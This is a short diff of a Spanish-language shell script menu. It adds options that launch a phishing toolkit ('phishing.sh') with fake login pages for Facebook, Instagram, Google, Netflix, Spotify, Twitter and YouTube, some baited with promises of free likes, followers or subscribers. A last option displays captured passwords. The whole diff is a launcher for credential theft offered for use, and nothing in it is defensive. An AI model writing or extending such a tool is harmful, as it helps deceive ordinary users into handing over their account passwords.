@@ -285,6 +285,7 @@ $ve LISTO,$am ejecuta el comando$ve said psi$am cada vez que quieras hacer un pi
 $re" 
 ;;
 psi)
+clear
 printf "
 $ce[$ve 0$ce ]$am Phishing para facebook en computadora
 $ce[$ve 1$ce ]$am Phishing para Facebook en celular
@@ -304,6 +305,36 @@ cd scam
 case $opcion in
 0)
 ./phishing.sh --use -facebook-pc
+;;
+1)
+./phishing.sh --use -Facebook
+;;
+2)
+./phishing.sh --use -facebook-bloqueo
+;;
+3)
+./phishing.sh --use -Facebook-auto-likes
+;;
+4)
+./phishing.sh --use -instagram
+;;
+5)
+./phishing.sh --use -google
+;;
+6)
+./phishing.sh --use -netflix
+;;
+7)
+./phishing.sh --use -spotify
+;;
+8)
+./phishing.sh --use -twiter-auto-seguidores
+;;
+9)
+./phishing.sh --use -Youtube-auto-suscriptores
+;;
+a) 
+./phishing.sh --ver -passwords
 ;;
 esac
 ;;
